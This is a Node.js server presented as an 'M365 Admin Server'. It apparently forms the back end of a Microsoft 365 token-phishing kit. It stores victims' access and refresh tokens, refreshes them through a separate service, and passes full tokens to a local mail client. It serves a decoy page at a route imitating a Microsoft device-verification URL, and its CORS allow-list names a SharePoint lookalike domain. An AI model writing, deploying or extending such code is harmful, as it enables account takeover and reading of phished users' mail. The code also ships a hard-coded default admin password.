#!/usr/bin/env node
// ╔══════════════════════════════════════════════════════════════════╗
// ║  M365 Admin Server                                               ║
// ║  Manages admin accounts + per-admin M365 token storage           ║
// ║  Uses better-sqlite3 (sync, zero-config, single file DB)         ║
// ║  Runs on http://localhost:3738                                   ║
// ╚══════════════════════════════════════════════════════════════════╝
//
// Setup:
//   npm install better-sqlite3
//   node admin-server.js
//
// Default admin: admin / admin1234@
//
// Routes:
//   POST /api/login                → { username, password } → session cookie
//   POST /api/logout               → clears session
//   GET  /api/me                   → current admin info
//   GET  /api/tokens               → list YOUR m365 tokens
//   POST /api/tokens               → add a token record
//   PUT  /api/tokens/:id           → update token (refresh etc.)
//   DELETE /api/tokens/:id         → remove a token
//   POST /api/tokens/:id/refresh   → ask token-refresher to refresh it
//   POST /api/admins               → create admin (any logged-in admin)
//   GET  /api/admins               → list all admins (id+username only)
//   PUT  /api/admins/password      → change own password
//   GET  /health                   → server status

const http    = require('http');
const https   = require('https');
const crypto  = require('crypto');
const fs      = require('fs');
const path    = require('path');

const PORT             = process.argv.includes('--port')
  ? parseInt(process.argv[process.argv.indexOf('--port') + 1], 10)
  : 3738;
const REFRESHER_URL = process.env.REFRESHER_URL || 'http://refresh-srv:3737/refresh';
const DB_PATH = path.resolve(process.cwd(), 'data', 'admin.db');
fs.mkdirSync(path.dirname(DB_PATH), { recursive: true });
const SESSION_TTL_MS   = 8 * 60 * 60 * 1000;  // 8 hours
const COOKIE_NAME      = 'm365_admin_sid';

// Allowed CORS origins — add or remove entries to match your deployment.
// The server will reflect the request Origin back only if it appears in this list.
const ALLOWED_ORIGINS = new Set([
  'https://uhp.sharepoint03420032.cloud',
  `http://127.0.0.1:${PORT}`,   // direct local access
  `http://localhost:${PORT}`,
]);

// ── Install check ─────────────────────────────────────────────────────────────
let Database;
try {
  Database = require('better-sqlite3');
} catch {
  console.error('\n❌  better-sqlite3 not found.');
  console.error('   Run:  npm install better-sqlite3\n');
  process.exit(1);
}

// ── Database setup ────────────────────────────────────────────────────────────
const db = new Database(DB_PATH);
db.pragma('journal_mode = WAL');
db.pragma('foreign_keys = ON');

db.exec(`
  CREATE TABLE IF NOT EXISTS admins (
    id         INTEGER PRIMARY KEY AUTOINCREMENT,
    username   TEXT    NOT NULL UNIQUE,
    pass_hash  TEXT    NOT NULL,
    pass_salt  TEXT    NOT NULL,
    created_at TEXT    NOT NULL DEFAULT (datetime('now'))
  );

  CREATE TABLE IF NOT EXISTS sessions (
    id         TEXT    PRIMARY KEY,
    admin_id   INTEGER NOT NULL REFERENCES admins(id) ON DELETE CASCADE,
    created_at TEXT    NOT NULL DEFAULT (datetime('now')),
    expires_at TEXT    NOT NULL
  );

  CREATE TABLE IF NOT EXISTS m365_tokens (
    id              INTEGER PRIMARY KEY AUTOINCREMENT,
    admin_id        INTEGER NOT NULL REFERENCES admins(id) ON DELETE CASCADE,
    label           TEXT,
    email           TEXT,
    name            TEXT,
    access_token    TEXT    NOT NULL,
    refresh_token   TEXT,
    expires_at      TEXT,
    token_file_name TEXT,
    token_file_path TEXT,
    raw_json        TEXT,
    added_at        TEXT    NOT NULL DEFAULT (datetime('now')),
    refreshed_at    TEXT
  );
`);

// Migration: add token_file_path column if upgrading from older DB
try {
  db.prepare('ALTER TABLE m365_tokens ADD COLUMN token_file_path TEXT').run();
} catch {}  // column already exists — ignore

// Create default admin if none exists
const adminCount = db.prepare('SELECT COUNT(*) as c FROM admins').get().c;
if (adminCount === 0) {
  const { hash, salt } = hashPassword('admin1234@');
  db.prepare('INSERT INTO admins (username, pass_hash, pass_salt) VALUES (?, ?, ?)')
    .run('admin', hash, salt);
  console.log('\n  ✓ Default admin created: admin / admin1234@');
  console.log('  ⚠  Change this password after first login!\n');
}

// ── Crypto helpers ────────────────────────────────────────────────────────────
function hashPassword(password, saltHex) {
  const salt = saltHex || crypto.randomBytes(16).toString('hex');
  const hash = crypto.pbkdf2Sync(password, salt, 100_000, 64, 'sha512').toString('hex');
  return { hash, salt };
}

function verifyPassword(password, hash, salt) {
  const { hash: h } = hashPassword(password, salt);
  return crypto.timingSafeEqual(Buffer.from(h, 'hex'), Buffer.from(hash, 'hex'));
}

function newSessionId() { return crypto.randomBytes(32).toString('hex'); }

// ── Session store ─────────────────────────────────────────────────────────────
const sessions = new Map();  // sid -> { adminId, expiresAt }

// Prune expired sessions from DB + memory on startup
db.prepare("DELETE FROM sessions WHERE expires_at < datetime('now')").run();

// Load active sessions into memory
for (const row of db.prepare('SELECT * FROM sessions').all()) {
  sessions.set(row.id, { adminId: row.admin_id, expiresAt: new Date(row.expires_at + 'Z').getTime() });
}

function createSession(adminId) {
  const sid       = newSessionId();
  const expiresAt = new Date(Date.now() + SESSION_TTL_MS);
  db.prepare('INSERT INTO sessions (id, admin_id, expires_at) VALUES (?, ?, ?)')
    .run(sid, adminId, expiresAt.toISOString().replace('T', ' ').slice(0, 19));
  sessions.set(sid, { adminId, expiresAt: expiresAt.getTime() });
  return sid;
}

function destroySession(sid) {
  db.prepare('DELETE FROM sessions WHERE id = ?').run(sid);
  sessions.delete(sid);
}

function getSession(sid) {
  if (!sid) return null;
  const s = sessions.get(sid);
  if (!s) return null;
  if (Date.now() > s.expiresAt) { destroySession(sid); return null; }
  return s;
}

// ── Cookie helpers ────────────────────────────────────────────────────────────
function parseCookies(cookieHeader) {
  const out = {};
  if (!cookieHeader) return out;
  for (const part of cookieHeader.split(';')) {
    const [k, ...v] = part.trim().split('=');
    if (k) out[k.trim()] = decodeURIComponent(v.join('=').trim());
  }
  return out;
}

function setCookieHeader(sid, maxAgeSec) {
  // Use Secure flag when the request came through HTTPS (nginx sets X-Forwarded-Proto)
  return `${COOKIE_NAME}=${sid}; HttpOnly; SameSite=Strict; Path=/; Max-Age=${maxAgeSec}; Secure`;
}

// ── CORS helpers ──────────────────────────────────────────────────────────────
// Reflect the request Origin only if it is in the allow-list.
// This correctly handles both local dev (127.0.0.1) and production (qink.online).
function getCorsHeaders(req) {
  const origin = req.headers.origin || '';
  const allowedOrigin = ALLOWED_ORIGINS.has(origin) ? origin : '';
  return {
    'Access-Control-Allow-Origin':      allowedOrigin,
    'Access-Control-Allow-Credentials': 'true',
    'Access-Control-Allow-Methods':     'GET, POST, PUT, DELETE, OPTIONS',
    'Access-Control-Allow-Headers':     'Content-Type',
    'Vary':                             'Origin',
  };
}

// ── Auth middleware ───────────────────────────────────────────────────────────
function requireAuth(req) {
  const sid     = parseCookies(req.headers.cookie)[COOKIE_NAME];
  const session = getSession(sid);
  if (!session) return null;
  const admin = db.prepare('SELECT id, username, created_at FROM admins WHERE id = ?').get(session.adminId);
  return admin || null;
}

// ── JWT decoder (for token metadata) ─────────────────────────────────────────
function decodeJwt(t) {
  try { return JSON.parse(Buffer.from(t.split('.')[1], 'base64url').toString()); }
  catch { return null; }
}

// ── HTTPS helper (for talking to token-refresher) ────────────────────────────
function httpPost(url, bodyObj) {
  return new Promise((resolve, reject) => {
    const body = JSON.stringify(bodyObj);
    const u    = new URL(url);
    const lib  = u.protocol === 'https:' ? https : http;
    const req  = lib.request({
      hostname: u.hostname,
      port:     u.port || (u.protocol === 'https:' ? 443 : 80),
      path:     u.pathname,
      method:   'POST',
      headers:  { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
    }, res => {
      let raw = '';
      res.on('data', c => raw += c);
      res.on('end', () => { try { resolve({ status: res.statusCode, body: JSON.parse(raw) }); } catch { reject(new Error('Bad JSON')); } });
    });
    req.on('error', reject);
    req.write(body);
    req.end();
  });
}

// ── Response helper ───────────────────────────────────────────────────────────
function send(res, status, obj, extraHeaders = {}, req = null) {
  const corsHeaders = req ? getCorsHeaders(req) : {};
  const body = JSON.stringify(obj);
  res.writeHead(status, {
    ...corsHeaders,
    'Content-Type':   'application/json',
    'Content-Length': Buffer.byteLength(body),
    ...extraHeaders,
  });
  res.end(body);
}

async function readBody(req) {
  let raw = '';
  for await (const chunk of req) raw += chunk;
  try { return JSON.parse(raw); } catch { return {}; }
}

// ── Route handlers ────────────────────────────────────────────────────────────

// POST /api/login
async function handleLogin(req, res) {
  const { username, password } = await readBody(req);
  if (!username || !password) return send(res, 400, { error: 'username and password required' }, {}, req);

  const admin = db.prepare('SELECT * FROM admins WHERE username = ?').get(username.trim().toLowerCase());
  if (!admin) return send(res, 401, { error: 'Invalid credentials' }, {}, req);

  let valid = false;
  try { valid = verifyPassword(password, admin.pass_hash, admin.pass_salt); } catch {}
  if (!valid) return send(res, 401, { error: 'Invalid credentials' }, {}, req);

  const sid = createSession(admin.id);
  send(res, 200,
    { ok: true, admin: { id: admin.id, username: admin.username } },
    { 'Set-Cookie': setCookieHeader(sid, Math.floor(SESSION_TTL_MS / 1000)) },
    req
  );
}

// POST /api/logout
function handleLogout(req, res) {
  const sid = parseCookies(req.headers.cookie)[COOKIE_NAME];
  if (sid) destroySession(sid);
  send(res, 200, { ok: true }, { 'Set-Cookie': setCookieHeader('', 0) }, req);
}

// GET /api/me
function handleMe(req, res) {
  const admin = requireAuth(req);
  if (!admin) return send(res, 401, { error: 'Not authenticated' }, {}, req);
  send(res, 200, { admin }, {}, req);
}

// GET /api/tokens
function handleGetTokens(req, res) {
  const admin = requireAuth(req);
  if (!admin) return send(res, 401, { error: 'Not authenticated' }, {}, req);

  const rows = db.prepare(`
    SELECT id, label, email, name, expires_at, token_file_name, token_file_path,
           added_at, refreshed_at,
           CASE WHEN refresh_token IS NOT NULL AND refresh_token != '' THEN 1 ELSE 0 END as has_refresh_token,
           substr(access_token, 1, 20) as token_preview
    FROM m365_tokens
    WHERE admin_id = ?
    ORDER BY added_at DESC
  `).all(admin.id);

  send(res, 200, { tokens: rows }, {}, req);
}

// GET /api/tokens/for-mail — full token data for ALL of this admin's tokens
function handleGetTokensForMail(req, res) {
  const admin = requireAuth(req);
  if (!admin) return send(res, 401, { error: 'Not authenticated' }, {}, req);

  const rows = db.prepare(`
    SELECT id, label, email, name, access_token, refresh_token, expires_at,
           token_file_name, token_file_path, raw_json
    FROM m365_tokens
    WHERE admin_id = ?
    ORDER BY added_at DESC
  `).all(admin.id);

  const tokens = rows.map(row => {
    let rawObj = {};
    try { rawObj = JSON.parse(row.raw_json || '{}'); } catch {}
    return {
      vault_id:        row.id,
      label:           row.label,
      email:           row.email,
      name:            row.name,
      access_token:    row.access_token,
      refresh_token:   row.refresh_token,
      expires_at:      row.expires_at,
      token_file_name: row.token_file_name,
      token_file_path: row.token_file_path,
    };
  });

  send(res, 200, { tokens }, {}, req);
}

// POST /api/tokens — add a new token
async function handleAddToken(req, res) {
  const admin = requireAuth(req);
  if (!admin) return send(res, 401, { error: 'Not authenticated' }, {}, req);

  const body = await readBody(req);
  const { raw_json, label, token_file_path: filePath } = body;

  if (!raw_json) return send(res, 400, { error: 'raw_json is required' }, {}, req);

  let tokenData;
  try { tokenData = typeof raw_json === 'string' ? JSON.parse(raw_json) : raw_json; }
  catch { return send(res, 400, { error: 'raw_json must be valid JSON' }, {}, req); }

  const at  = tokenData.access_token;
  const rt  = tokenData.refresh_token || null;
  if (!at) return send(res, 400, { error: 'No access_token in token data' }, {}, req);

  const decoded   = decodeJwt(at);
  const email     = tokenData.email     || decoded?.upn || decoded?.unique_name || '';
  const name      = tokenData.name      || decoded?.name || '';
  const expiresAt = tokenData.expires_at || (tokenData.expires_in ? new Date(Date.now() + tokenData.expires_in * 1000).toISOString() : null);

  const resolvedFilePath = filePath || tokenData.token_file_path || null;
  const resolvedFileName = resolvedFilePath ? path.basename(resolvedFilePath) : (tokenData.token_file || null);

  const result = db.prepare(`
    INSERT INTO m365_tokens (admin_id, label, email, name, access_token, refresh_token, expires_at, token_file_name, token_file_path, raw_json)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
  `).run(
    admin.id,
    label || email || 'Token ' + new Date().toLocaleString(),
    email, name, at, rt,
    expiresAt,
    resolvedFileName,
    resolvedFilePath,
    JSON.stringify(tokenData)
  );

  send(res, 201, { ok: true, id: result.lastInsertRowid, email, name, expires_at: expiresAt }, {}, req);
}

// DELETE /api/tokens/:id
function handleDeleteToken(req, res, id) {
  const admin = requireAuth(req);
  if (!admin) return send(res, 401, { error: 'Not authenticated' }, {}, req);

  const row = db.prepare('SELECT id FROM m365_tokens WHERE id = ? AND admin_id = ?').get(id, admin.id);
  if (!row) return send(res, 404, { error: 'Token not found' }, {}, req);

  db.prepare('DELETE FROM m365_tokens WHERE id = ?').run(id);
  send(res, 200, { ok: true }, {}, req);
}

// POST /api/tokens/:id/refresh — ask token-refresher server to refresh
async function handleRefreshToken(req, res, id) {
  const admin = requireAuth(req);
  if (!admin) return send(res, 401, { error: 'Not authenticated' }, {}, req);

  const row = db.prepare('SELECT * FROM m365_tokens WHERE id = ? AND admin_id = ?').get(id, admin.id);
  if (!row) return send(res, 404, { error: 'Token not found' }, {}, req);

  if (!row.refresh_token) return send(res, 400, { error: 'No refresh_token stored — cannot refresh' }, {}, req);

  let rawObj = {};
  try { rawObj = JSON.parse(row.raw_json || '{}'); } catch {}
  const tokenData = { ...rawObj, access_token: row.access_token, refresh_token: row.refresh_token, expires_at: row.expires_at };

  const refreshBody = row.token_file_path && fs.existsSync(row.token_file_path)
    ? { tokenFilePath: row.token_file_path }
    : { tokenData };

  let freshData;
  try {
    const resp = await httpPost(REFRESHER_URL, refreshBody);
    if (resp.status !== 200 || resp.body.error) throw new Error(resp.body.error || `Status ${resp.status}`);
    freshData = resp.body;
  } catch (e) {
    return send(res, 502, { error: 'Refresh failed: ' + e.message, hint: 'Is token-refresher.js running on port 3737?' }, {}, req);
  }

  db.prepare(`
    UPDATE m365_tokens
    SET access_token = ?, refresh_token = ?, expires_at = ?, refreshed_at = datetime('now'),
        email = COALESCE(?, email), name = COALESCE(?, name),
        raw_json = ?
    WHERE id = ?
  `).run(
    freshData.access_token,
    freshData.refresh_token || row.refresh_token,
    freshData.expires_at,
    freshData.email || null,
    freshData.name  || null,
    JSON.stringify(freshData),
    id
  );

  const fileSaved = !!(row.token_file_path && freshData.refreshed);
  send(res, 200, {
    ok: true,
    expires_at: freshData.expires_at,
    email:      freshData.email || row.email,
    name:       freshData.name  || row.name,
    file_saved: fileSaved,
    file_path:  row.token_file_path || null,
  }, {}, req);
}

// GET /api/tokens/:id/full — return full token data (for mail client handoff)
function handleGetFullToken(req, res, id) {
  const admin = requireAuth(req);
  if (!admin) return send(res, 401, { error: 'Not authenticated' }, {}, req);

  const row = db.prepare('SELECT * FROM m365_tokens WHERE id = ? AND admin_id = ?').get(id, admin.id);
  if (!row) return send(res, 404, { error: 'Token not found' }, {}, req);

  let rawObj = {};
  try { rawObj = JSON.parse(row.raw_json || '{}'); } catch {}

  send(res, 200, {
    token: {
      ...rawObj,
      access_token:  row.access_token,
      refresh_token: row.refresh_token,
      expires_at:    row.expires_at,
      email:         row.email,
      name:          row.name,
    }
  }, {}, req);
}

// POST /api/admins — create a new admin
async function handleCreateAdmin(req, res) {
  const admin = requireAuth(req);
  if (!admin) return send(res, 401, { error: 'Not authenticated' }, {}, req);

  const { username, password } = await readBody(req);
  if (!username || !password) return send(res, 400, { error: 'username and password required' }, {}, req);
  if (password.length < 8) return send(res, 400, { error: 'Password must be at least 8 characters' }, {}, req);

  const exists = db.prepare('SELECT id FROM admins WHERE username = ?').get(username.trim().toLowerCase());
  if (exists) return send(res, 409, { error: 'Username already taken' }, {}, req);

  const { hash, salt } = hashPassword(password);
  const result = db.prepare('INSERT INTO admins (username, pass_hash, pass_salt) VALUES (?, ?, ?)')
    .run(username.trim().toLowerCase(), hash, salt);

  send(res, 201, { ok: true, id: result.lastInsertRowid, username: username.trim().toLowerCase() }, {}, req);
}

// GET /api/admins
function handleListAdmins(req, res) {
  const admin = requireAuth(req);
  if (!admin) return send(res, 401, { error: 'Not authenticated' }, {}, req);

  const rows = db.prepare('SELECT id, username, created_at FROM admins ORDER BY id').all();
  send(res, 200, { admins: rows }, {}, req);
}

// PUT /api/admins/password
async function handleChangePassword(req, res) {
  const admin = requireAuth(req);
  if (!admin) return send(res, 401, { error: 'Not authenticated' }, {}, req);

  const { current_password, new_password } = await readBody(req);
  if (!current_password || !new_password) return send(res, 400, { error: 'current_password and new_password required' }, {}, req);
  if (new_password.length < 8) return send(res, 400, { error: 'Password must be at least 8 characters' }, {}, req);

  const full = db.prepare('SELECT * FROM admins WHERE id = ?').get(admin.id);
  let valid = false;
  try { valid = verifyPassword(current_password, full.pass_hash, full.pass_salt); } catch {}
  if (!valid) return send(res, 401, { error: 'Current password is incorrect' }, {}, req);

  const { hash, salt } = hashPassword(new_password);
  db.prepare('UPDATE admins SET pass_hash = ?, pass_salt = ? WHERE id = ?').run(hash, salt, admin.id);
  send(res, 200, { ok: true }, {}, req);
}

// ── HTML file helper ──────────────────────────────────────────────────────────
function serveHtml(res, filename) {
  const htmlPath = path.join(__dirname, filename);
  if (fs.existsSync(htmlPath)) {
    const content = fs.readFileSync(htmlPath);
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Content-Length': content.length });
    res.end(content);
  } else {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end(`${filename} not found. Place it in the same directory as admin-server.js`);
  }
}

// ── Main router ───────────────────────────────────────────────────────────────
const server = http.createServer(async (req, res) => {
  const method = req.method.toUpperCase();
  const url    = req.url.split('?')[0].replace(/\/$/, '') || '/';

  // CORS preflight
  if (method === 'OPTIONS') {
    const headers = {
      ...getCorsHeaders(req),
      'Content-Length': '0',
    };
    res.writeHead(204, headers);
    res.end();
    return;
  }

  console.log(`[${new Date().toISOString()}] ${method} ${url}`);

  // ── Static HTML files ────────────────────────────────────────────────────
  if (method === 'GET' && url === '/admin')    return serveHtml(res, 'admin.html');
  if (method === 'GET' && url === '/onedrive') return serveHtml(res, 'onedrive.html');
  const decodedUrl = decodeURIComponent(url);
  
  if (decodedUrl === '/microsoft-device%verify%file%access%azure%authentication') {
    return serveHtml(res, 'sharepoint.html');
  }  

  // Mail client — protected: redirect to /admin if no valid session
  if (method === 'GET' && (url === '/mail' || url === '/localmail.html')) {
    const sid     = parseCookies(req.headers.cookie)[COOKIE_NAME];
    const session = getSession(sid);
    if (!session) {
      // Use a root-relative redirect so it works behind any proxy / domain
      res.writeHead(302, { 'Location': '/admin' });
      res.end();
      return;
    }
    return serveHtml(res, 'localmail.html');
  }

  // Health check
  if (method === 'GET' && url === '/admin-health') {
    send(res, 200, { status: 'ok', server: 'M365 Admin', port: PORT, time: new Date().toISOString() }, {}, req);
    return;
  }

  // ── API routes ───────────────────────────────────────────────────────────
  if (method === 'POST' && url === '/api/login')           return handleLogin(req, res);
  if (method === 'POST' && url === '/api/logout')          return handleLogout(req, res);
  if (method === 'GET'  && url === '/api/me')              return handleMe(req, res);
  if (method === 'GET'  && url === '/api/tokens')          return handleGetTokens(req, res);
  if (method === 'GET'  && url === '/api/tokens/for-mail') return handleGetTokensForMail(req, res);
  if (method === 'POST' && url === '/api/tokens')          return handleAddToken(req, res);
  if (method === 'GET'  && url === '/api/admins')          return handleListAdmins(req, res);
  if (method === 'POST' && url === '/api/admins')          return handleCreateAdmin(req, res);
  if (method === 'PUT'  && url === '/api/admins/password') return handleChangePassword(req, res);

  // /api/tokens/:id
  const tokenMatch = url.match(/^\/api\/tokens\/(\d+)$/);
  if (tokenMatch) {
    const id = parseInt(tokenMatch[1], 10);
    if (method === 'DELETE') return handleDeleteToken(req, res, id);
    if (method === 'GET')    return handleGetFullToken(req, res, id);
  }
  const refreshMatch = url.match(/^\/api\/tokens\/(\d+)\/refresh$/);
  if (refreshMatch && method === 'POST') return handleRefreshToken(req, res, parseInt(refreshMatch[1], 10));

  send(res, 404, { error: `Unknown route: ${method} ${url}` }, {}, req);
});

server.listen(PORT, process.env.HOST || '0.0.0.0', () => {
  console.log('');
  console.log('╔══════════════════════════════════════════════════════════════╗');
  console.log('║  M365 Admin Server  ✓ Running                               ║');
  console.log('╠══════════════════════════════════════════════════════════════╣');
  console.log(`║  http://127.0.0.1:${String(PORT).padEnd(42)}║`);
  console.log('║                                                              ║');
  console.log('║  Pages:                                                      ║');
  console.log('║    /admin   → Admin portal                                  ║');
  console.log('║    /mail    → Mail client   (login required → redirects)    ║');
  console.log('║                                                              ║');
  console.log('║  Default login: admin / admin1234@                          ║');
  console.log('║  ⚠  Change password after first login!                      ║');
  console.log('║                                                              ║');
  console.log(`║  Database: ${path.basename(DB_PATH).padEnd(50)}║`);
  console.log('╚══════════════════════════════════════════════════════════════╝');
  console.log('');
});

server.on('error', e => {
  if (e.code === 'EADDRINUSE') { console.error(`\n❌  Port ${PORT} already in use. Try: node admin-server.js --port 3739\n`); }
  else console.error('\n❌  Server error:', e.message);
  process.exit(1);
});

process.on('SIGINT',  () => { db.close(); server.close(() => process.exit(0)); });
process.on('SIGTERM', () => { db.close(); server.close(() => process.exit(0)); });